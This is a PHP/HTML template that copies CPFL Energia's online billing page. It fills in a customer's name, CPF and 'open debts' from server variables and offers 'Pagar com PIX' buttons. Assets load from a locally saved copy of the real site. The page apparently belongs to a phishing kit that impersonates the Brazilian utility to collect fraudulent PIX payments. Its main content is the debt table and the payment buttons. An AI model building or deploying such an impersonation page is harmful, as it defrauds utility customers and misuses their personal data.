                                                                            ng-repeat="item in ::items"
                                                                            ng-if="((item.status !== &#39;hidden&#39;) || isValidRole(item))"
                                                                            class="ng-scope col-md-12">
                                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) --><a
                                                                                ng-if="(((item.status !== &#39;disabled&#39;) || isValidRole(item)) &amp;&amp; item.state)"
                                                                                href="https://servicosonline.cpfl.com.br/agencia-webapp/#/taxas-tarifas"
                                                                                ui-sref="app.taxas-tarifas"
                                                                                ui-sref-opts="" class="ng-scope"><i
                                                                                    ng-class="item.classIcon"></i><span
                                                                                    ng-class="item.classLabel"
                                                                                    translate=""
                                                                                    class="ng-scope ng-binding">Taxas e
                                                                                    tarifas</span> </a>
                                                                            <!-- end ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) -->
                                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.url) -->
                                                                            <!-- ngIf: (item.status === 'disabled' && !isValidRole(item)) -->
                                                                            <!-- ngIf: item.items.length > 0 -->
                                                                        </li>
                                                                        <!-- end ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                                        <!-- end ngRepeat: item in ::items -->
                                                                        <!-- ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                                        <li ng-class="{&#39;col-md-12&#39;: item.classItem == &#39;sub-item-menu&#39;, &#39;col-md-16 border-right&#39;: item.classItem != &#39;sub-item-menu&#39;}"
                                                                            ng-mouseover="emitEvent(item);"
                                                                            ng-mouseleave="eventHidetooltip();"
                                                                            ng-repeat="item in ::items"
                                                                            ng-if="((item.status !== &#39;hidden&#39;) || isValidRole(item))"
                                                                            class="ng-scope col-md-12">
                                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) --><a
                                                                                ng-if="(((item.status !== &#39;disabled&#39;) || isValidRole(item)) &amp;&amp; item.state)"
                                                                                href="https://servicosonline.cpfl.com.br/agencia-webapp/#/ouvidoria"
                                                                                ui-sref="app.ouvidoria" ui-sref-opts=""
                                                                                class="ng-scope"><i
                                                                                    ng-class="item.classIcon"></i><span
                                                                                    ng-class="item.classLabel"
                                                                                    translate=""
                                                                                    class="ng-scope ng-binding">Ouvidoria</span>
                                                                            </a>
                                                                            <!-- end ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) -->
                                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.url) -->
                                                                            <!-- ngIf: (item.status === 'disabled' && !isValidRole(item)) -->
                                                                            <!-- ngIf: item.items.length > 0 -->
                                                                        </li>
                                                                        <!-- end ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                                        <!-- end ngRepeat: item in ::items -->
                                                                        <!-- ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                                        <li ng-class="{&#39;col-md-12&#39;: item.classItem == &#39;sub-item-menu&#39;, &#39;col-md-16 border-right&#39;: item.classItem != &#39;sub-item-menu&#39;}"
                                                                            ng-mouseover="emitEvent(item);"
                                                                            ng-mouseleave="eventHidetooltip();"
                                                                            ng-repeat="item in ::items"
                                                                            ng-if="((item.status !== &#39;hidden&#39;) || isValidRole(item))"
                                                                            class="ng-scope col-md-12">
                                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) --><a
                                                                                ng-if="(((item.status !== &#39;disabled&#39;) || isValidRole(item)) &amp;&amp; item.state)"
                                                                                href="https://servicosonline.cpfl.com.br/agencia-webapp/#/indicadores-processo-amostral"
                                                                                ui-sref="app.indicadores-processo-amostral"
                                                                                ui-sref-opts="" class="ng-scope"><i
                                                                                    ng-class="item.classIcon"></i><span
                                                                                    ng-class="item.classLabel"
                                                                                    translate=""
                                                                                    class="ng-scope ng-binding">Indicadores
                                                                                    Qualidade do Produto</span> </a>

                                                                        </li>

                                                                    </ul>
                                                                </div><!-- end ngIf: item.items.length > 0 -->
                                                            </li>
                                                            <!-- end ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                            <!-- end ngRepeat: item in ::items -->
                                                            <!-- ngIf: items[0].classItem !== 'sub-item-menu' -->
                                                            <div ng-if="items[0].classItem !== &#39;sub-item-menu&#39;"
                                                                class="col-md-8 text-left text-align-middle ng-scope ng-binding"
                                                                translate=""
                                                                style="margin: 0em; position: absolute; top: 50%; left: 75%; margin - right: -50%; transform: translate(-50%, -50%); ">
                                                            </div>
                                                            <!-- end ngIf: items[0].classItem !== 'sub-item-menu' -->
                                                        </ul>
                                                    </li>
                                                </ul>

                                                <ul style="display:none;"
                                                    class="nav navbar-nav navbar-right navbar-login ng-scope"
                                                    ng-if="!menuCtrl.isLogged &amp;&amp; menuCtrl.showMenu()">
                                                    <li>
                                                        <div class="boxUser"><a class="btn-usuario ng-scope"
                                                                ui-sref="app.login.login"
                                                                translate="@APP-COMMON-MENU-ENTRAR" title="Entrar"
                                                                href="https://servicosonline.cpfl.com.br/agencia-webapp/#/login">Entrar</a>
                                                        </div>
                                                    </li>
                                                </ul><!-- end ngIf: !menuCtrl.isLogged && menuCtrl.showMenu() -->
                                            </div>
                                        </div>
                                    </nav>
                                </div>
                            </ng-include>
                        </div><!-- end ngIf: menuCtrl.showMenuContingencia -->

                        <subcabecalho ng-if="menuCtrl.exibirMenuServicos" class="ng-scope ng-isolate-scope">
                            <style type="text/css"></style>

                        </subcabecalho><!-- end ngIf: menuCtrl.exibirMenuServicos -->
                        <div class="row">
                            <div class="container">
                                <div class="row">
                                    <div class="col-xs-24">
                                        <!-- uiView: content -->

                                        <?php if($Protocolo && $sucesso){ ?>

                                        <div ui-view="content" autoscroll="false" class="pages-content ng-scope">
                                            <div class="historico-contas ng-scope">
                                                <div class="row">
                                                    <div class="col-xs-24">
                                                        <!-- ngIf: vm.situacao.Protocolo -->
                                                        <section id="info-protocolo" ng-if="vm.situacao.Protocolo"
                                                            class="ng-scope">
                                                            <div class="protocolo">
                                                                <div class="protocolo-primary"><span
                                                                        translate="@APP-VIA-PAGAMENTO-PROTOCOLO"
                                                                        class="ng-scope">Protocolo de Atendimento:
                                                                    </span> <span class="numero-protocolo ng-binding"
                                                                        ng-bind="vm.situacao.Protocolo"><?=$Protocolo?></span>
                                                                </div>
                                                            </div>
                                                        </section><!-- end ngIf: vm.situacao.Protocolo -->
                                                    </div><!-- ngIf: vm.situacao -->
                                                    <div ng-if="vm.situacao" class="ng-scope">
                                                        <div class="row">
                                                            <div class="col-xs-24">
                                                                <alert target="via-pagamento" class="ng-isolate-scope">
                                                                    <!-- ngRepeat: alert in $ctrl.alerts  | filter: $ctrl.filtro -->
                                                                </alert>
                                                            </div>
                                                        </div>
                                                        <div class="row">
                                                            <div class="col-xs-24">
                                                                <section id="debitosPendentes" class="historicoContas">
                                                                    <div class="panel panel-default">

                                                                        <div class="panelHistoricoContasHeader">

                                                                            <?php if($total){ ?>

                                                                            <div class="panel-heading ng-scope"
                                                                                ng-if="vm.possuiDebitosEmAberto"><span
                                                                                    ng-bind="vm.valorDebitos | currency"
                                                                                    class="historicoContasValor ng-binding">R$
                                                                                    <?=number_format($total,2,",",".")?></span>
                                                                                <span
                                                                                    translate="@APP-VIA-PAGAMENTO-TOTAL-DEBITOS-EM-ABERTO-TITULO"
                                                                                    class="historicoContasTitulo ng-scope">Total
                                                                                    de débitos em aberto</span>
                                                                            </div>

                                                                            <?php }else{ ?>

                                                                            <div class="panel-heading ng-scope"
                                                                                ng-if="!vm.possuiDebitosEmAberto"><span
                                                                                    translate="@APP-VIA-PAGAMENTO-SEM-CONTAS-EM-ABERTO"
                                                                                    class="historicoContasTitulo ng-scope">Você
                                                                                    não possui débitos em aberto!</span>
                                                                            </div>

                                                                            <?php } ?>

                                                                            <!-- end ngIf: vm.possuiDebitosEmAberto -->
                                                                        </div>
                                                                        <div class="alert alert-warning" role="alert">
                                                                            <div class="alert-icon warning-icon"></div>
                                                                            <span class="alert-message ng-scope"
                                                                                translate="@APP-VIA-PAGAMENTO-ALERTA-PRIVACIDADE">Para
                                                                                manter a privacidade dos seus dados
                                                                                ocultamos parte do nome e endereço na
                                                                                via simplificada</span>
                                                                        </div><!-- ngIf: vm.possuiDebitosEmAberto -->
                                                                        <div class="panel-body ng-scope"
                                                                            ng-if="vm.possuiDebitosEmAberto">



                                                                            <table
                                                                                ng-table="vm.tableDebitosAbertosParams"
                                                                                class="table hidden-xs ng-scope ng-table">
                                                                                <thead>

                                                                                    <tr>

                                                                                        <th translate="@APP-VIA-PAGAMENTO-DEBITOS-EM-ABERTO-COLHEAD-MES-REF"
                                                                                            class="ng-scope">Nome
                                                                                        </th>
                                                                                        <th translate="@APP-VIA-PAGAMENTO-DEBITOS-EM-ABERTO-COLHEAD-DESCRICAO-FATURA"
                                                                                            class="ng-scope">Documento
                                                                                        </th>
                                                                                        <th translate="@APP-VIA-PAGAMENTO-DEBITOS-EM-ABERTO-COLHEAD-VALOR"
                                                                                            class="ng-scope">Valor</th>
                                                                                        <th translate="@APP-VIA-PAGAMENTO-DEBITOS-EM-ABERTO-COLHEAD-VENCIMENTO"
                                                                                            class="ng-scope">Vencimento
                                                                                        </th>
                                                                                        <th style="text-align: center;width: 159px;"
                                                                                            translate="@APP-VIA-PAGAMENTO-DEBITOS-EM-ABERTO-COLHEAD-VISUALIZAR"
                                                                                            class="ng-scope">Visualizar
                                                                                        </th>
                                                                                    </tr>
                                                                                </thead>

                                                                                <tbody>

                                                                                    <?php 
                                                                                
                                                                                $meses_abreviado = array(
                                                                                        'Jan',
                                                                                        'Fev',
                                                                                        'Mar',
                                                                                        'Abr',
                                                                                        'Mai',
                                                                                        'Jun',
                                                                                        'Jul',
                                                                                        'Ago',
                                                                                        'Set',
                                                                                        'Out',
                                                                                        'Nov',
                                                                                        'Dez'
                                                                                    );
                                                                                
                                                                                   function limparValor($valor) {
                                                                                        // Remove tudo que não for número, vírgula ou ponto
                                                                                        $valor = preg_replace('/[^0-9,\.]/', '', $valor);

                                                                                        // Remove pontos (separador de milhar)
                                                                                        $valor = str_replace('.', '', $valor);

                                                                                        // Troca vírgula por ponto (decimal)
                                                                                        $valor = str_replace(',', '.', $valor);

                                                                                        // Converte para float
                                                                                        $numero = floatval($valor);

                                                                                        // Formata no padrão BR: 1.234,56
                                                                                        return number_format($numero, 2, ',', '.');
                                                                                    }

                                                                                for ($i=0; $i <count($faturas); $i++) {  if(trim($faturas[$i]->valor) != ',00'){ ?>

                                                                                    <tr ng-repeat="registro in $data track by $index"
                                                                                        class="ng-scope">


                                                                                        <td ng-bind="registro.MesReferencia"
                                                                                            class="ng-binding"><?php
                                                                                                
                                                                                                echo $dados->nome;
                                                                                                
                                                                                                ?>
                                                                                        </td>
                                                                                        <td ng-bind="registro.DescricaoFatura"
                                                                                            class="ng-binding">
                                                                                            <?=$dados->cpf?>
                                                                                        </td>
                                                                                        <td ng-bind="registro.Valor | currency"
                                                                                            class="ng-binding">
                                                                                            R$
                                                                                            <?php 

                                                                                           echo $val = limparValor(trim($faturas[$i]->valor));

                                                                                             // number_format($val,2,",",".");
                                                                                            
                                                                                            ?>
                                                                                        </td>
                                                                                        <td ng-bind="registro.Vencimento | date:&#39;dd/MM/yyyy&#39;"
                                                                                            class="ng-binding">
                                                                                            <?php
                                                                                                
                                                                                                echo $faturas[$i]->vencimento;


                                                                                                ?></td>
                                                                                        <td class="valign-middle">
                                                                                            <!-- ngIf: registro.showBtnSegundaVia --><button
                                                                                                onclick="verFatura('<?=$faturas[$i]->NumeroContaEnergia?>', '<?=limparValor($faturas[$i]->valor)?>', '<?=$i?>')"
                                                                                                class="btn btn-default btn-segunda-via-aberta ng-scope"
                                                                                                ng-click="vm.selecionarContaAberta(registro);"
                                                                                                translate="@APP-VIA-PAGAMENTO-BTN-SEGUNDA-VIA"
                                                                                                ng-if="registro.showBtnSegundaVia"><span
                                                                                                    class="edp-btn edp-btn--primary edp-btn--outline modalQRCode w-100"
                                                                                                    data-info="EAAAAJDprABhBBIsIa0ubSHeBZlA4Ewo_gLBqgdaWDG3b_3qmb2YglQ6UBCu5R9d1b3IvdIdPXHiTtl2pCJ3K8VrT2UwEiw1o-eusz3CKlxMv6236BOo3JgQ02WoV3GeZT4c2htMgunAAfItPh1_4pjlNGPe7lFGk97X_HEetxE4zWfGmI3pkqfiW5lSLsgCp6wB6A"
                                                                                                    style="color: white;">
                                                                                                    <img src="./<?= $diretorio ?>/CPFLEnergia_files/icone_pix_verde.svg"
                                                                                                        width="25">
                                                                                                    Pagar com PIX
                                                                                                </span></button>


                                                                                            <button
                                                                                                onclick="openPVC(true);"
                                                                                                class="btn btn-default btn-segunda-via-aberta ng-scope"
                                                                                                ng-click="vm.selecionarContaAberta(registro);"
                                                                                                translate="@APP-VIA-PAGAMENTO-BTN-SEGUNDA-VIA"
                                                                                                ng-if="registro.showBtnSegundaVia"
                                                                                                style="margin-left: 8px;display: none;"><span
                                                                                                    class="edp-btn edp-btn--primary edp-btn--outline modalQRCode w-100"
                                                                                                    data-info="EAAAAJDprABhBBIsIa0ubSHeBZlA4Ewo_gLBqgdaWDG3b_3qmb2YglQ6UBCu5R9d1b3IvdIdPXHiTtl2pCJ3K8VrT2UwEiw1o-eusz3CKlxMv6236BOo3JgQ02WoV3GeZT4c2htMgunAAfItPh1_4pjlNGPe7lFGk97X_HEetxE4zWfGmI3pkqfiW5lSLsgCp6wB6A"
                                                                                                    style="color: white;">
                                                                                                    <img src="./<?= $diretorio ?>/CPFLEnergia_files/icon_credit_card.svg"
                                                                                                        width="25">Pagar
                                                                                                    com Cartão
                                                                                                </span></button>


                                                                                            <!-- end ngIf: registro.showBtnSegundaVia -->
                                                                                        </td>
                                                                                    </tr>

                                                                                    <?php } }?>



                                                                                </tbody>
                                                                            </table>



                                                                            <div ng-table-pagination="params"
                                                                                template-url="templates.pagination"
                                                                                class="ng-scope ng-isolate-scope">
                                                                                <!-- ngInclude: templateUrl -->
                                                                                <div ng-include="templateUrl"
                                                                                    class="ng-scope">
                                                                                    <!-- ngIf: params.data.length -->
                                                                                    <div class="ng-table-pager ng-scope"
                                                                                        ng-if="params.data.length">
                                                                                        <!-- ngIf: params.settings().counts.length -->
                                                                                        <!-- ngIf: pages.length -->
                                                                                    </div>
                                                                                    <!-- end ngIf: params.data.length -->
                                                                                </div>
                                                                            </div>


                                                                            <table
                                                                                ng-table="vm.tableDebitosAbertosParams"
                                                                                class="table hidden-sm hidden-md hidden-lg ng-scope ng-table">
                                                                                <thead>
                                                                                    <tr></tr>
                                                                                </thead>
                                                                                <tbody>
                                                                                    <?php 
                                                                                
                                                                                $meses_abreviado = array(
                                                                                        'Jan',
                                                                                        'Fev',
                                                                                        'Mar',
                                                                                        'Abr',
                                                                                        'Mai',
                                                                                        'Jun',
                                                                                        'Jul',
                                                                                        'Ago',
                                                                                        'Set',
                                                                                        'Out',
                                                                                        'Nov',
                                                                                        'Dez'
                                                                                    );
                                                                                
                                                                                for ($i=0; $i <count($faturas); $i++) {   ?>

                                                                                    <tr ng-repeat="registro in $data track by $index"
                                                                                        class="ng-scope">


                                                                                        <td ng-bind="registro.MesReferencia"
                                                                                            class="ng-binding"><?php
                                                                                                
                                                                                               echo $dados->nome;
                                                                                                
                                                                                                ?>
                                                                                        </td>
                                                                                        <td ng-bind="registro.DescricaoFatura"
                                                                                            class="ng-binding">
                                                                                            <?=$dados->cpf?>
                                                                                        </td>
                                                                                        <td ng-bind="registro.Valor | currency"
                                                                                            class="ng-binding">
                                                                                            R$<?=limparValor($faturas[$i]->valor)?>
                                                                                        </td>
                                                                                        <td ng-bind="registro.Vencimento | date:&#39;dd/MM/yyyy&#39;"
                                                                                            class="ng-binding">
                                                                                            <?php
                                                                                                
                                                                                                    echo $faturas[$i]->vencimento;


                                                                                                ?></td>
                                                                                        <td class="valign-middle">
                                                                                            <!-- ngIf: registro.showBtnSegundaVia --><button
                                                                                                onclick="verFatura('<?=$faturas[$i]->NumeroContaEnergia?>', '<?=$faturas[$i]->valor?>', '<?=$i?>')"
                                                                                                class="btn btn-default btn-segunda-via-aberta ng-scope"
                                                                                                ng-click="vm.selecionarContaAberta(registro);"
                                                                                                translate="@APP-VIA-PAGAMENTO-BTN-SEGUNDA-VIA"
                                                                                                ng-if="registro.showBtnSegundaVia"><span
                                                                                                    class="edp-btn edp-btn--primary edp-btn--outline modalQRCode w-100"
                                                                                                    data-info="EAAAAJDprABhBBIsIa0ubSHeBZlA4Ewo_gLBqgdaWDG3b_3qmb2YglQ6UBCu5R9d1b3IvdIdPXHiTtl2pCJ3K8VrT2UwEiw1o-eusz3CKlxMv6236BOo3JgQ02WoV3GeZT4c2htMgunAAfItPh1_4pjlNGPe7lFGk97X_HEetxE4zWfGmI3pkqfiW5lSLsgCp6wB6A"
                                                                                                    style="color: white;">
                                                                                                    <img src="./<?= $diretorio ?>/CPFLEnergia_files/icone_pix_verde.svg"
                                                                                                        width="25">
                                                                                                    Pagar com Pix
                                                                                                </span></button>
                                                                                            <!-- end ngIf: registro.showBtnSegundaVia -->
                                                                                        </td>
                                                                                    </tr>

                                                                                    <?php } ?>


                                                                                </tbody>
                                                                            </table>

                                                                            <div ng-table-pagination="params"
                                                                                template-url="templates.pagination"
                                                                                class="ng-scope ng-isolate-scope">
                                                                                <!-- ngInclude: templateUrl -->
                                                                                <div ng-include="templateUrl"
                                                                                    class="ng-scope">
                                                                                    <!-- ngIf: params.data.length -->
                                                                                    <div class="ng-table-pager ng-scope"
                                                                                        ng-if="params.data.length">
                                                                                        <!-- ngIf: params.settings().counts.length -->
                                                                                        <!-- ngIf: pages.length -->
                                                                                    </div>
                                                                                    <!-- end ngIf: params.data.length -->
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                        <!-- end ngIf: vm.possuiDebitosEmAberto -->
                                                                        <!-- ngIf: vm.possuiDebitosEmAberto -->



                                                                        <!-- end ngIf: vm.possuiDebitosEmAberto -->
                                                                        <!-- ngIf: vm.possuiDebitosEmAberto -->
                                                                        <div class="panel-footer panelHistoricoContasFooter hidden-lg hidden-md ng-scope"
                                                                            ng-if="vm.possuiDebitosEmAberto">
                                                                            <div id="botoes">
                                                                                <div class="row">
                                                                                    <div
                                                                                        class="col-xs-24 col-md-8 col-md-push-8">
                                                                                        <div class="buttons"><button
                                                                                                id="btnImprimirDebitos"
                                                                                                type="button"
                                                                                                class="btn btn-default btn-lg btn-block hand ng-scope"
                                                                                                ng-click="vm.SelecionarMultiplasContasMob()"
                                                                                                translate="@APP-VIA-PAGAMENTO-BTN-BAIXAR-TODAS-MOBILE">Baixar
                                                                                                Selecionadas</button>
                                                                                        </div>
                                                                                    </div>
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                        <!-- end ngIf: vm.possuiDebitosEmAberto -->
                                                                    </div>


                                                                </section>
                                                            </div>
                                                        </div>
                                                    </div><!-- end ngIf: vm.situacao -->
                                                </div>
                                            </div>
                                        </div>

                                        <?php }else{ ?>
                                        <br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>
                                        <?php  } ?>


                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="row" id="menu-footer">
                            <!-- ngInclude: -->
                            <ng-include src="&#39;modules/common/partials/footer.html&#39;" class="ng-scope">
                                <footer class="ng-scope">
                                    <div class="rodape">
                                        <div class="container">
                                            <div class="row">
                                                <div class="col-xs-24 col-md-24 np">
                                                    <aside class="col-xs-24 col-md-4">
                                                        <div class="navegacao">
                                                            <h2><img class="img-footer"
                                                                    src="./<?= $diretorio ?>/CPFLEnergia_files/logo-cpfl-energia.svg">
                                                            </h2>
                                                        </div>
                                                    </aside>
                                                    <aside class="col-xs-24 col-md-12">
                                                        <div class="navegacao">
                                                            <div class="row">
                                                                <nav class="linksFooter">
                                                                    <ul>
                                                                        <li><a title="Institucional" class="hand"
                                                                                ng-click="$root.openExternalLink(&#39;https://www.cpfl.com.br/institucional/quem-somos/Paginas/default.aspx&#39;, &#39;_blank&#39;)">Institucional</a>
                                                                            | <a title="Atendimento ao consumidor"
                                                                                ng-click="$root.openExternalLink(&#39;https://www.cpfl.com.br/atendimento-a-consumidores/localidade/Paginas/default.aspx&#39;, &#39;_blank&#39;)">Atendimento
                                                                                ao consumidor</a><br><a
                                                                                title="Energias sustentáveis"
                                                                                class="hand"
                                                                                ng-click="$root.openExternalLink(&#39;https://www.cpfl.com.br/energias-sustentaveis/Paginas/default.aspx&#39;, &#39;_blank&#39;)">Energias
                                                                                sustentáveis</a> | <a
                                                                                title="Unidades de negócios"
                                                                                class="hand"
                                                                                ng-click="$root.openExternalLink(&#39;https://www.cpfl.com.br/unidades-de-negocios/Paginas/default.aspx&#39;, &#39;_blank&#39;)">Unidades
                                                                                de negócios</a> | <a title="Imprensa"
                                                                                class="hand"
                                                                                ng-click="$root.openExternalLink(&#39;https://www.cpfl.com.br/imprensa/Paginas/default.aspx&#39;, &#39;_blank&#39;)">Imprensa</a>
                                                                        </li>
                                                                    </ul>
                                                                </nav>
                                                                <div class="col-md-24 col-lg-24 np">
                                                                    <nav class="col-md-12 col-lg-12 np">
                                                                        <div class="linkNavLefts">
                                                                            <ul>
                                                                                <li><a class="hand"
                                                                                        ng-click="$root.openExternalLink(&#39;https://www.cpfl.com.br/institucional/quem-somos/Paginas/default.aspx&#39;, &#39;_blank&#39;)"
                                                                                        title="Institucional">Institucional</a>
                                                                                </li>
                                                                                <li><a class="hand"
                                                                                        ng-click="$root.openExternalLink(&#39;https://www.cpfl.com.br/atendimento-a-consumidores/localidade/Paginas/default.aspx&#39;, &#39;_blank&#39;)"
                                                                                        title="Atendimento a consumidores">Atendimento
                                                                                        a consumidores</a></li>
                                                                                <li><a class="hand"
                                                                                        ng-click="$root.openExternalLink(&#39;https://www.cpfl.com.br/energias-sustentaveis/Paginas/default.aspx&#39;, &#39;_blank&#39;)"
                                                                                        target="_blank"
                                                                                        title="Energias sustentáveis">Energias
                                                                                        sustentáveis</a></li>
                                                                            </ul>
                                                                        </div>
                                                                    </nav>
                                                                    <nav class="col-md-12 col-lg-12 np">
                                                                        <div class="linkNavRight">
                                                                            <ul>
                                                                                <li><a class="hand"
                                                                                        ng-click="$root.openExternalLink(&#39;https://www.cpfl.com.br/unidades-de-negocios/Paginas/default.aspx&#39;, &#39;_blank&#39;)"
                                                                                        title="Unidades de negócios">Unidades
                                                                                        de negócios</a></li>
                                                                                <li><a class="hand"
                                                                                        ng-click="$root.openExternalLink(&#39;https://www.cpfl.com.br/imprensa/Paginas/default.aspx&#39;, &#39;_blank&#39;)"
                                                                                        title="Imprensa">Imprensa</a>
                                                                                </li>
                                                                            </ul>
                                                                        </div>
                                                                    </nav>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </aside>
                                                    <aside class="col-xs-24 col-md-4 col-lg-4 np">
                                                        <div class="redesSociais">
                                                            <h3>Siga-nos nas redes sociais:</h3>
                                                            <nav class="listSociais">
                                                                <ul>
                                                                    <li><a class="hand"
                                                                            ng-click="$root.openExternalLink(&#39;https://www.cpfl.com.br/rede-social/Paginas/facebook.aspx&#39;, &#39;_blank&#39;)"
                                                                            title="facebook"><span
                                                                                class="ico-facebook"></span></a></li>
                                                                    <li><a class="hand"
                                                                            ng-click="$root.openExternalLink(&#39;https://twitter.com/cpflenergia&#39;, &#39;_blank&#39;)"
                                                                            title="twitter"><span
                                                                                class="ico-twitter"></span></a></li>
                                                                    <li><a class="hand"
                                                                            ng-click="$root.openExternalLink(&#39;https://www.cpfl.com.br/rede-social/Paginas/youtube.aspx&#39;, &#39;_blank&#39;)"
                                                                            title="youtube"><span
                                                                                class="ico-youtube"></span></a></li>
                                                                    <li><a class="hand"
                                                                            ng-click="$root.openExternalLink(&#39;https://www.cpfl.com.br/rede-social/Paginas/Linkedin.aspx&#39;, &#39;_blank&#39;)"
                                                                            title="linkedin"><span
                                                                                class="ico-linkedin"></span></a></li>
                                                                </ul>
                                                            </nav>
                                                        </div>
                                                    </aside>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="copyright">
                                        <div class="container">
                                            <div class="row">
                                                <div class="col-xs-24">
                                                    <p>CPFL Energia 2026. Todos os direitos reservados. <span><a
                                                                class="hand" title="Aviso de Privacidade"
                                                                target="_blank"
                                                                href="https://www.cpfl.com.br/institucional/privacidade/aviso-de-privacidade/Paginas/default.aspx">Aviso
                                                                de Privacidade</a> | <a class="hand"
                                                                title="Termos de Uso" ui-sref="app.termo-uso"
                                                                href="https://servicosonline.cpfl.com.br/agencia-webapp/#/termo-uso">Termos
                                                                de Uso</a></span></p>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </footer>
                            </ng-include>
                        </div>
                    </div>
                </main>
            </div>
        </div>
    </div>


    <div
        style="background-color: rgb(255, 255, 255); border: 1px solid rgb(204, 204, 204); box-shadow: rgba(0, 0, 0, 0.2) 2px 2px 3px; position: absolute; transition: visibility 0s linear 0.3s, opacity 0.3s linear 0s; opacity: 0; visibility: hidden; z-index: 2000000000; left: 338.4px; top: -10000px;">
        <div
            style="width: 100%; height: 100%; position: fixed; top: 0px; left: 0px; z-index: 2000000000; background-color: rgb(255, 255, 255); opacity: 0.05;">
        </div>
        <div class="g-recaptcha-bubble-arrow"
            style="border-width: 11px; border-style: solid; border-color: transparent rgb(204, 204, 204) transparent transparent; border-image: initial; width: 0px; height: 0px; position: absolute; pointer-events: none; margin-top: -11px; z-index: 2000000000; top: 273.2px; right: 100%;">
        </div>
        <div class="g-recaptcha-bubble-arrow"
            style="border-width: 10px; border-style: solid; border-color: transparent rgb(255, 255, 255) transparent transparent; border-image: initial; width: 0px; height: 0px; position: absolute; pointer-events: none; margin-top: -10px; z-index: 2000000000; top: 273.2px; right: 100%;">
        </div>

    </div>
    <style>
    @media only screen and (min-width: 992px) {
        .cpfl-style .table tbody tr td {
            font-size: 1em;
            padding: .8em .2em;
            text-align: center;
        }
    }

    .table>caption+thead>tr:first-child>td,
    .table>caption+thead>tr:first-child>th,
    .table>colgroup+thead>tr:first-child>td,
    .table>colgroup+thead>tr:first-child>th,
    .table>thead:first-child>tr:first-child>td,
    .table>thead:first-child>tr:first-child>th {
        border-top: 0;
        text-align: center;
    }
    </style>
</body>

</html>